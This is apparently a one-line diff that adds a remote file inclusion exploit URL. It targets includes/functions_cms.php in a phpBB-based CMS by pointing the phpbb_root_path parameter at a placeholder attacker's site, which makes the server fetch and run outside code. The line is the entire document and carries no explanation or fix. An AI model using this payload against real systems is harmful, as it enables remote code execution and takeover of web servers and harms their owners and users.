@@ -1,0 +1,1 @@
+http://www.example.com/[path]/includes/functions_cms.php?phpbb_root_path=[attacker's site]
